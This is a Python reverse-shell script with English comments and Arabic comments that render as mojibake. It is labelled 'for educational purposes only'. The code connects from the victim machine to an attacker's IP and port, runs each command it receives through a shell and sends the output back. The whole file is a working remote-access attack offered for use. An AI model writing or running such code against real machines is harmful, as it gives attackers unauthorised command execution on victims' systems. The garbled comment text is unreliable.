# ๐ ุณูุฑูุจุช Reverse Shell ุจุณูุท ุจูุบุฉ ุจุงูุซููุ ููุชุนูู ููุท
# ูุชู ุชุดุบููู ุนูู ุฌูุงุฒ ุงูุถุญูุฉ ููุงุชุตุงู ุจุฌูุงุฒ ุงูููุงุฌู ูุชูููุฐ ุฃูุงูุฑู

# ๐ ููุท ูุฃุบุฑุงุถ ุชุนููููุฉ - ูููุน ุงุณุชุฎุฏุงูู ูู ุฃู ูุดุงุท ุบูุฑ ูุงูููู

# Simple reverse shell in Python (For educational purposes only)
# This script connects back to the attacker's machine and executes received commands.

import subprocess  # ๐ ููุชุจุฉ ููุชุนุงูู ูุน ุงูุฃูุงูุฑ ููุฎุฑุฌุงุชูุง - ุฃูุถู ูู os.system
import socket      # ๐ ููุชุจุฉ ุจุงูุซูู ูุฅูุดุงุก ุงูุงุชุตุงู ุนุจุฑ ุงูุดุจูุฉ

# ุฅุนุฏุงุฏ ุงูุงุชุตุงู
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ip = "0.0.0.0"     # ุนููุงู ุฌูุงุฒ ุงูููุงุฌู (ุนุฏููู ุฅูู ุนููุงูู ุงูุญูููู ุนูุฏ ุงูุชุฌุฑูุจ)
port = 4445        # ุงููููุฐ ุงููุณุชุฎุฏู - ุชุฃูุฏ ุฃูู ููุชูุญ ุนูู ุฌุฏุงุฑ ุงูุญูุงูุฉ ูุฏูู

try:
    s.connect((ip, port))  # ุงูุงุชุตุงู ุจุฌูุงุฒ ุงูููุงุฌู
    print("[+] Waiting for connection...")
    print(f"[+] Connection established from {ip}:{port}")
except Exception as err:
    print(f"[!] Connection failed: {err}")
    exit(1)

# ุงูุงุณุชูุงุน ูุชูููุฐ ุงูุฃูุงูุฑ ุงููุฑุณูุฉ ูู ุงูุทุฑู ุงูุขุฎุฑ
while True:
    try:
        command = s.recv(4096).decode()  # ุงุณุชูุจุงู ุงูุฃูุฑ ูู ุงูููุงุฌู
        if not command:
            break  # ูู ุญุงู ุงููุทุน ุงูุงุชุตุงู
        result = subprocess.check_output(
            command, shell=True, text=True, stderr=subprocess.STDOUT
        )
        s.send(result.encode())  # ุฅุฑุณุงู ูุชูุฌุฉ ุงูุชูููุฐ
    except subprocess.CalledProcessError as e:
        # ุฅุฑุณุงู ุฃู ุฎุทุฃ ูู ุงูุชูููุฐ ููููุงุฌู
        s.send(str(e.output).encode())
    except Exception as e:
        # ุงูุชุนุงูู ูุน ุฃู ุฎุทุฃ ุนุงู
        s.send(f"[!] Unexpected error: {str(e)}".encode())



    
    


